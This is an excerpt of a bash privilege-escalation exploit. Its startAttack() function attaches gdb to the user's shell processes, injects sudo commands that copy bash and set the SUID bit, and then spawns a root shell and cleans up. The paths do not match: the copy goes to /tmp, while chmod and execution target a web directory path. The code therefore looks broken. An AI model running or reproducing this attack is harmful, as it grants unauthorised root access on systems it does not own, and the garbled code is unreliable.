...
function startAttack(){
  tput civis && pgrep "^(echo $(cat /etc/shells | tr '/' ' ' | awk 'NF{print $NF}' | tr '\n' '|'))$" -u "$(id -u)" | sed '$ d' | while read shell_pid; do
    ...
    fi; echo 'call system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /var/www/clients/client1/web89/web/ >/dev/null 2>&1")' | gdb -q -n -p "$shell_pid" >/dev/null 2>&1
    done

    if [ -f /var/www/clients/client1/web89/web/ ]; then
      /var/www/clients/client1/web89/web/ -p -c 'echo -ne "\n[*] Cleaning up..."
                       rm /var/www/clients/client1/web89/web/
                       echo -e "                            [√]"
                       echo -ne "[*] Spawning root shell..."
                       echo -e "                    [√]\n"
                       tput cnorm && bash -p'
    else
      echo -e "\n[*] Could not copy SUID to /var/www/clients/client1/web89/web/          [✗]"
    fi
}
